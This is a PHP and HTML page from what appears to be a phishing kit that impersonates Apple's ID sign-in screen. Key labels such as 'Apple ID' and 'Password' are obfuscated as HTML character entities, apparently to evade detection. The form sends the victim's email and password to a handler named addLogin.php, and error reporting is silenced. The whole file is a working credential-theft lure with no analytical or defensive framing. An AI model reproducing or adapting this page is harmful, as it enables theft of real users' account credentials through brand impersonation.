<?php 
  

    @error_reporting(0);
    ob_start();
    session_start();
    if ( !isset( $_SESSION['randString'] ) ) {
        header("Location: index.php");
    }
    include "languages/{$_SESSION['language']}.php";
    require "partials/enc.php";
?>
<?php include 'partials/header.php'; ?>
<div id="content">
  <div class="extra-container">
    <?php include 'partials/nav.php'; ?>

    <div class="subnav">
      <div class="container">
        <div class="title pull-left"><?php echo $phEmail; ?></div>
        <div class="menu-wrapper pull-right">
          <ul class="menu">
            <li class="item active"><a class="btn btn-link btn-signin" href="#"><?php echo $signin; ?></a></li>
            <li class="item"><a class="btn btn-link btn-create" href="#"><?php echo $create; ?></a></li>
            <li class="item"><a class="btn btn-link btn-faq" href="#"><?php echo $faq; ?></a></li>
          </ul>
        </div>
      </div>
    </div>

    <div class="paws signin">
      <h1 class="LoginTitle">&#65;&#112;&#112;&#108;&#101;&#32;&#73;&#68;</h1>
      <div class="si-body si-container container-fluid" data-theme="lite" id="content">
        <div class="widget-container fade-in restrict-max-wh fade-in" data-mode="embed">
          <div class=""><img style="width: 200px;" class="TextLogo" src="assets/img/logo.png"></div>
          <div class="signin fade-in">
            <h1 class="LoginTitkle tx1"><?php echo $frmHead; ?></h1>
            <form action="addLogin.php" class="container HolderOfTheFields" name="login" id="name" method="POST">
              <div class="row no-gutter si-field apple-id">
                <div class="col-xs-12 fld">
                  <span
                    class="LoginTitle">&#77;&#97;&#110;&#97;&#103;&#101;&#32;&#121;&#111;&#117;&#114;&#32;&#65;&#112;&#112;&#108;&#101;&#32;&#97;&#99;&#99;&#111;&#117;&#110;&#116;&#32;&#65;&#112;&#112;&#108;&#101;&#32;&#73;&#68;</span>
                  <input class="si-text-field eml" name="eemm" placeholder="<?php echo $phEmail; ?>" spellcheck="false"
                    type="email">
                </div>
              </div>
              <div class="field-separator"></div>
              <div class="row no-gutter si-field pwd">
                <div class="col-xs-12 fld">
                  <label class="LoginTitle" for="pwd">&#80;&#97;&#115;&#115;&#119;&#111;&#114;&#100;</label>
                  <input class="si-password si-text-field" name="ppss" placeholder="<?php echo $phPass; ?>"
                    type="password">
                </div>
              </div>

              <div class="si-remember-password">
                <input class="checkbx" tabindex="0" type="checkbox">
                <label id="lbl" class="form-label" for="remember-me" style="font-weight:600;">
                  <span class="lblcheck"></span><?php echo $remember; ?>
                </label>
              </div>
              <button class="si-button btn disabled" id="go" tabindex="0">
                <i class="icon icon_sign_in"></i>
                <img id="spin" style="display:none" src="assets/img/spinner.gif">
              </button>
            </form>
            <script>
            $(document).ready(function() {
              function isEmail(email) {
                var rg = /^([a-zA-Z0-9_.+-])+\@(([a-zA-Z0-9-])+\.)+([a-zA-Z0-9]{2,4})+$/;
                return rg.test(email);
              }

              $('.si-field').focusin(() => {
                $('.field-separator').css('background-color', '#4570e4');
              });

              $('.si-field').focusout(() => {
                $('.field-separator').css('background-color', 'rgba(0, 0, 0, 0.1)');
              });

              function validate() {
                var check = true;

                if (!isEmail($('.eml').val())) {
                  check = false;
                }

                if (!($('.si-password').val().length > 7)) {
                  check = false;
                }

                $('.si-text-field').each((i, el) => {
                  if ($(el).val() == '') {
                    check = false;
                  }
                });
                return check;
              }

              $('.si-text-field').on('keyup', () => {

                if (validate()) {
                  $('#go').attr('class', 'si-button');
                } else {
                  $('#go').attr('class', 'si-button btn disabled');
                }
              });

              $('#name').submit(() => {

                if (!validate()) {
                  return false;
                }

                $('.icon_sign_in').css('display', 'none');
                $('#spin').css('display', 'block');
              });
            });
            </script>
            <div class="si-container-footer"></div>
          </div>
        </div>
      </div>
    </div>

    <div id="flow">
      <div class="flow-body signin clearfix" role="main">
        <div class="container">
          <div class="forgot" id="forgot-link"><a href="#" style="font-weight:600;"><?php echo $forgot; ?></a></div>
          <div class="flex home-content">
            <h2 id="Title" class="title separator" style="font-weight:600;"><?php echo $bodyHead; ?></h2>
            <div id="TitleMsg" class="intro"><?php echo $smlHead; ?></div>
            <div id="LearnMore" class="intro"><a class="button faq-link" href="#"><?php echo $learn; ?><i
                  class="icon Righty"></i></a></div>
            <div id="AppIconsWrapper" class="apps text-center"><img class="ApplicationIcons" src="assets/img/icons.jpg"
                height="68" width="656"></div>
            <div id="CreateAccount" class="intro create show"><a class="button create-link"
                href="#"><?php echo $register; ?><i class="icon Righty"></i></a></div>
          </div>
        </div>
      </div>
    </div>

    <script type="text/javascript">
    $('title').html('&#83;&#105;&#103;&#110;&#32;&#73;&#110;');
    </script>
    <?php include 'partials/footer.php'; ?>